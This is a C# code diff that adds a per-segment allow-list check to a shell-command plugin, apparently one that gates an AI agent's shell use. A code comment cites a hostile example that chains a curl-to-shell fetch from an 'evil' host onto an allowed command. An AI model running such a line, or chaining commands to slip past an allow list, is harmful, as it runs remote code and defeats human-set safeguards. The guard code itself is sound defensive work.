@@ -733,6 +733,41 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
     private static string CollapseWhitespace(string s) =>
         WhitespaceRun.Replace(DangerousCommandDetector.Normalize(s).Replace("\\\n", " "), " ");
 
+    // AllowMode "segments": every simple command in the string must start with an allow pattern, so a
+    // command that merely *contains* an allowed phrase (`go test; curl evil | sh`) is rejected. See
+    // ShellPolicy.AllowMode and DangerousCommandDetector.EnumerateCommands.
+    private static string? CheckAllowPerSegment(string commandOrScript, IReadOnlyList<string> allow)
+    {
+        var commands = DangerousCommandDetector.EnumerateCommands(commandOrScript);
+        if (commands is null)
+            return PluginResult.Denied(
+                "Shell command blocked: it has a command substitution ($( ) or backticks) inside a quoted " +
+                "argument, which can't be checked against the allow list (AllowMode: segments). Move the " +
+                "substitution outside the quotes, or split it into separate commands.");
+
+        var patterns = allow.Select(CollapseWhitespace).ToList();
+        foreach (var command in commands)
+        {
+            var text = CollapseWhitespace(command.Text);
+            if (patterns.Any(p => StartsWithCommandPattern(text, p))) continue;
+
+            var shown = text.Length > 80 ? text[..80] + "…" : text;
+            return PluginResult.Denied(
+                $"Shell command blocked: '{shown}' is not matched by any configured allow pattern " +
+                "(AllowMode: segments — every command in a pipeline or sequence must match one). " +
+                $"Allowed: {string.Join(", ", allow.Select(p => $"'{p}'"))}.");
+        }
+        return null;
+    }
+
+    // Prefix match on a word boundary: "go test" matches "go test ./..." but not "go testing".
+    private static bool StartsWithCommandPattern(string text, string pattern) =>
+        pattern.Length > 0
+        && text.StartsWith(pattern, StringComparison.OrdinalIgnoreCase)
+        && (text.Length == pattern.Length
+            || char.IsWhiteSpace(pattern[^1])
+            || char.IsWhiteSpace(text[pattern.Length]));
+
     // Checks the command against the configured ShellPolicy allow/deny lists.
     // Deny is evaluated first; a matching deny pattern blocks the command regardless of allow.
     // Allow is only evaluated when the allow list is non-empty; the command must contain at
@@ -757,6 +792,9 @@ public sealed class ShellPlugin : IDisposable, ITurnResettable
                         $"Shell command blocked: matches configured deny pattern '{pattern}'.");
             }
         }
+
+        if (_shellPolicy.Allow is { Count: > 0 } && _shellPolicy.AllowSegments)
+            return CheckAllowPerSegment(commandOrScript, _shellPolicy.Allow);
 
         if (_shellPolicy.Allow is { Count: > 0 })
         {
